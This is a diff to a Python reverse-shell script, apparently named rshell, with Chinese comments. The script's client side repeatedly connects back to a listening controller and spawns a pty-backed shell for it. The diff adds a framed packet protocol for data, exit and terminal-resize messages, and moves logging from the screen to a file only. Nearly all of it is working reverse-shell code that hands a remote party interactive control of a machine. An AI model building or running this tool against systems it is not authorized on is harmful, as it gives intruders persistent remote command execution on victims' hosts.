@@ -8,10 +8,12 @@
 """
 
 import os
+import io
 import sys
 import pty
 import tty
 import time
+import enum
 import fcntl
 import socket
 import struct
@@ -32,17 +34,17 @@ STDOUT = sys.stdout.fileno()
 
 
 def getlogger(level=logging.INFO):
-    fmt = logging.Formatter("%(asctime)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
+    fmt = logging.Formatter("%(asctime)s %(levelname)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
 
-    stream = logging.StreamHandler(sys.stdout)
-    stream.setFormatter(fmt)
+    # stream = logging.StreamHandler(sys.stdout)
+    # stream.setFormatter(fmt)
 
     fp = logging.FileHandler("rshell.logs")
     fp.setFormatter(fmt)
 
     logger = logging.getLogger("rshell")
     logger.setLevel(level)
-    logger.addHandler(stream)
+    # logger.addHandler(stream)
     logger.addHandler(fp)
     return logger
 
@@ -60,28 +62,85 @@ def set_pty_size(fd, columns, rows):
     return fcntl.ioctl(fd, termios.TIOCSWINSZ, size)
 
 
-# 窗口大小调整
+# 窗口大小调整, 这样是调控制端的。
 def signal_SIGWINCH_handle(sigNum, frame):
     size = get_pty_size(STDOUT)
-    # logger.info(f"窗口大小改变: {size}")
+    logger.debug(f"窗口大小改变: {size}")
     set_pty_size(STDOUT, *size)
-    # logger.info("sigwinch 执行完成")
+    logger.debug("sigwinch 执行完成")
 
 
-def socketshell(sock, size):
+class PacketType(enum.IntEnum):
+    """
+    一字节，数据包类型。
+    """
+    ZERO = 0 # 保留
+    EXIT = enum.auto()
+    TTY_RESIZE = enum.auto()
+    TRANER = enum.auto()
+
+class RecvSend:
+
+    def __init__(self, sock):
+        self.sock = sock
+    
+    def read(self):
+        data = self.sock.recv(2)
+        logger.debug(f"read() payload 长度 --> {len(data)}")
+        lenght = struct.unpack("!H", data)[0]
+        payload = io.BytesIO()
+
+        c = lenght
+        while c > 0:
+            d = self.sock.recv(c)
+
+            if d == b"":
+                logger.debug(f"peer close()")
+                raise ValueError(f"peer close()")
+
+            c -= len(d)
+
+            payload.write(d)
+        
+        typ = payload.getvalue()[0]
+        data = payload.getvalue()[1:]
+        logger.debug(f"sock recv --> typ: {typ}, data: {data}")
+        return typ, data
+    
+    def write(self, typ, data):
+        data_len = len(data)
+        if data_len > 65536:
+            raise ValueError("数据包太大： 0 ~ 65536")
+
+        payload = io.BytesIO()
+        payload.write(struct.pack("!HB", data_len + 1, typ))
+
+        payload.write(data)
+
+        return self.sock.send(payload.getvalue())
+
+    def fileno(self):
+        return self.sock.fileno()
+
+    def close(self):
+        self.sock.close()
+
+
+
+def socketshell(conn):
     try:
         env = os.environ.copy()
         pty_master, pty_slave = pty.openpty()
 
-        # 设置对面 终端大小
-        set_pty_size(pty_slave, *size)
-
         ss = selectors.DefaultSelector()
+        sock = RecvSend(conn)
 
         ss.register(pty_master, selectors.EVENT_READ)
         ss.register(sock, selectors.EVENT_READ)
 
-        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)
+        # 这两个种在linux上都可以,目前还没看出区别在哪。
+        # p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)
+        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid)
 
         BREAK=False
         # while p.poll() is None:
@@ -91,29 +150,40 @@ def socketshell(sock, size):
 
                 fd = key.fileobj
                 if fd == sock:
-                    data = sock.recv(1024)
-                    logger.debug(f"sock recv: {data}")
-                    
-                    # 在peer挂掉的情况下会出现
-                    if data == b"":
-                        # p 的关闭 放到 finally
+                    typ, data = sock.read()
+                    if typ == PacketType.TRANER:
+                        os.write(pty_master, data)
+
+                    elif typ == PacketType.EXIT:
+                        logger.debug(f"正常退出")
                         BREAK=True
                         break
-                    os.write(pty_master, data)
+
+                    elif typ == PacketType.TTY_RESIZE:
+                        # 设置成对面终端大小
+                        if len(data) == 4:
+                            logger.debug(f"接收到的终端大小ok")
+                            size = struct.unpack("!HH", data)
+                            set_pty_size(pty_slave, *size)
+                        else:
+                            logger.debug(f"接收到的终端大小不正常: {data}")
 
                 elif fd == pty_master:
-                    data = os.read(pty_master, 1024)
-                    logger.debug(f"pty read: {data}")
+                    data = os.read(pty_master, 4096)
+                    logger.debug(f"pty_master read: {data}")
                     if data:
-                        sock.send(data)
+                        sock.write(PacketType.TRANER, data)
                     else:
-                        BREAK=True
-                        break
+                        logger.debug(f"从 pty_master 读出了空字节")
 
                 # 这样按一次ctrl+D，就会正常退出了.
                 if p.poll() is not None:
                     BREAK=True
+                    logger.debug(f"ctrl+D 退出")
+                    sock.write(PacketType.EXIT, b"")
                     break
+                else:
+                    logger.debug(f"p.poll() --> {p.poll()} 没有退出")
 
             if BREAK:
                 break
@@ -121,7 +191,9 @@ def socketshell(sock, size):
             #logger.info("新的一轮 select()")
     except Exception as e:
         # raise e
-        logger.info(f"捕获到异常退出: {e}")
+        logger.error(f"捕获到异常退出: {e}")
+        # traceback.print_exc()
+        logger.error(traceback.format_exc())
 
     finally:
         sock.close()
@@ -135,7 +207,7 @@ def server(addr, port):
     logger.info(f"{sys.argv[0]} listen: {server_addr}")
 
     try:
-        signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
+        # signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
 
         sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
         sock.bind(server_addr)
@@ -143,15 +215,21 @@ def server(addr, port):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
 
-        client, addr = sock.accept()
+        client_sock, addr = sock.accept()
+        # client_sock.setblocking(False)
         logger.info(f"有反向shell连接上: {addr}")
+
+        client = RecvSend(client_sock)
 
 
         size = get_pty_size(STDIN)
         logger.info(f"向对面发送终端大小： {size}")
-        client.send(struct.pack("!HH", *size))
+
+        n = client.write(PacketType.TTY_RESIZE, struct.pack("!HH", *size))
+        logger.debug(f"初始化对面终端大小 时发送的数据量: {n} 字节")
     
         # 关闭监听
+        logger.info(f"关闭监听")
         sock.close()
 
         # tty 
@@ -171,17 +249,37 @@ def server(addr, port):
 
                 fd = key.fileobj
                 if fd == client:
-                    data = client.recv(1024)
-                    if data == b"":
+
+                    try:
+                        typ, data = client.read()
+                    except ValueError:
+                        traceback.print_exc()
                         exit_flag = False
-                        logger.debug(f"server client.recv 空: {data}")
                         break
-                    os.write(STDOUT, data)
+
+                    if typ == PacketType.TRANER:
+                        os.write(STDOUT, data)
+
+                    elif typ == PacketType.EXIT:
+                        exit_flag = False
+                        break
+                    
+                    elif typ == PacketType.TTY_RESIZE:
+                        # 控制端， 不会收到 被控端的 TTY_RESIZE
+                        pass
+                    else:
+                        logger.error(f"未知的传输类型: {typ}")
 
                 elif fd == STDIN:
-                    data = os.read(STDIN, 1024)
-                    client.send(data)
-
+                    data = os.read(STDIN, 4096)
+                    if data == b"":
+                        # 说明控制端， 主动退出？
+                        logger.debug(f'os.read(STDIN) --> b""')
+                        client.write(PacketType.EXIT, data)
+                    else:
+                        logger.debug(f"os.read(STDIN) --> {data}")
+                        client.write(PacketType.TRANER, data)
+            
         logger.debug(f"exit_flag: {exit_flag} 退出了")
     except Exception:
         traceback.print_exc()
@@ -200,11 +298,10 @@ def client(addr, port=6789):
     
     server_addr = (addr, port)
 
-    # sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-    # sock.settimeout(10)
-
-    GO=False
     while True:
+
+        GO=False
+
         try:
             sock = socket.create_connection(server_addr, timeout=10)
         except TimeoutError:
@@ -224,28 +321,12 @@ def client(addr, port=6789):
             time.sleep(10)
             continue
 
-        # 拿到初始化终端大小
-        """
-        # 感觉一次只发4个字节，tcp也应该是需要一次接收
-        size_d = b""
-        while True:
-            d = sock.recv(1)
-            if d == b"":
-                logger.info("Peer关闭")
-                sock.close()
-
-                
-                size_d += d
-        """
-        # 感觉一次只发4个字节，tcp也应该是需要一次接收
-        size = sock.recv(4)
-        size = struct.unpack("!HH", size)
-
         logger.info(f"client connect: {server_addr}")
-        th = threading.Thread(target=socketshell, args=(sock, size), daemon=True)
+        # sock.setblocking(False) # 又用同步的方式去使用，会报错误：BlockingIOError: [Errno 11] Resource temporarily unavailable
+        th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
         th.start()
         th.join()
-        logger.info(f"连接server: {server_addr}, 正常退出")
+        logger.info(f"连接 server: {server_addr}, socketshell 线程退出")
         time.sleep(10)
 
 
@@ -292,9 +373,6 @@ def main():
         return args.func(args)
     except KeyboardInterrupt:
         pass
-
-    # parse.print_help()
-    # sys.exit(1)
 
 
 if __name__ == "__main__":
